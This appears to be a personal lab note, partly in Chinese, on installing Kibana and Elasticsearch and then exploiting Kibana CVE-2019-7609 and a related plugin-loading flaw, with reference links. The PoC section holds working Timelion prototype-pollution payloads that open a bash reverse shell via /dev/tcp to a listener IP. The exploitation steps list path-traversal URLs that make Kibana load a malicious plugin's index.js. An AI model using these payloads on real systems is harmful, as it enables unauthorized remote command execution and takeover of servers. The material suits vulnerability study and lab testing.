### Download and install
- https://www.elastic.co/downloads/kibana
- https://artifacts.elastic.co/downloads/kibana/kibana-6.2.4-linux-x86_64.tar.gz
- https://www.elastic.co/downloads/past-releases#elasticsearch
- https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.1.1-linux-x86_64.tar.gz
- https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.2.4.zip

```
Run bin/kibana (or bin\kibana.bat on Windows)
```

![image](https://user-images.githubusercontent.com/30398606/160968247-fc9def98-5a03-4f56-a3c8-3fd6e5497250.png)


依赖Elasticsearch。
### 修改端口地址
`config/elasticsearch.yml`
```
network.host
```
`config/kibana.yml`
```
server.host
```

- https://www.elastic.co/guide/cn/kibana/current/settings.html
- 
### 载入数据

安装完ElasticSearch之后需要载入数据，否则出现这种情况：
![image](https://user-images.githubusercontent.com/30398606/160978398-9e1b2ad7-b2fc-476a-ab88-2e390a6d7779.png)

- https://www.elastic.co/guide/en/kibana/6.7/tutorial-load-dataset.html

### kibana CVE-2019-7609

- https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
- https://github.com/nobodyatall648/writeup/blob/master/TryHackMe/kiba.pdf
- https://www.youtube.com/watch?v=xF5i30mXhSM
- https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Kibana/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/


### CVE-2019-7609

> Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.


### PoC
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/127.0.0.1/6666 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```


但是漏洞触发，还需要点击"Canvas"。但是某些版本，比如6.2.4并没有"Canvas"功能。


### Rescue
![image](https://user-images.githubusercontent.com/30398606/160997528-7ae1dc1d-8df6-4a32-a6e8-8e47d0e0d1a9.png)

![image](https://user-images.githubusercontent.com/30398606/160998219-fb2d6312-ced4-4912-b3df-2ead6af97ccb.png)

确实下载了test.zip，但是安装出错，导致kibana退出了。如果是实战中，就悲剧了，把有漏洞的kibana给关了，真的无法利用了。
![image](https://user-images.githubusercontent.com/30398606/160999181-696f238a-adca-44bb-a813-2aca8dcb574b.png)

原来是没有把index.js打包进去。

安装失败参考这个构造zip包：
https://github.com/outbrain/ob-kb-percent/issues/7

![image](https://user-images.githubusercontent.com/30398606/161001182-62faa5e8-6d69-4464-8367-c27aecbdbe9d.png)

确保把package.json和index.js都打包进去。
![image](https://user-images.githubusercontent.com/30398606/161003176-a8df6af8-4d10-4553-ad4e-a2f32325b9e0.png)

虽然报这个错，但是插件已经安装成功了。
![image](https://user-images.githubusercontent.com/30398606/161003301-b4029b69-54d8-45cf-8918-2ea3f0ad511d.png)


### 利用过程
0、准备恶意插件：







1、设置payload：


2、触发下载插件：
http://192.168.17.128:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../cli_plugin/cli.js




3、触发Kibana加载插件，执行恶意的index.js
http://192.168.17.128:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../plugins/synacktiv/index.js
![image](https://user-images.githubusercontent.com/30398606/161235363-3c99ed01-1a6a-4311-99bc-32ea44bbe370.png)


![image](https://user-images.githubusercontent.com/30398606/161235216-0dc772bb-6de5-4f4a-addf-8025a32e36cf.png)

利用有风险，很多地方都能把kibana给弄挂。这里反弹shell结束之后，kibana就挂了。

## Ref
- https://github.com/mpgn/CVE-2019-7609
- https://github.com/mpgn/CVE-2018-17246
- https://www.synacktiv.com/en/publications/pwning-an-outdated-kibana-with-not-so-sad-vulnerabilities.html
- https://twitter.com/chybeta/status/1185860595620311042
- https://github.com/harsh-bothra/learn365/blob/main/days/day32.md
- https://github.com/kh4sh3i/ElasticSearch-Pentesting
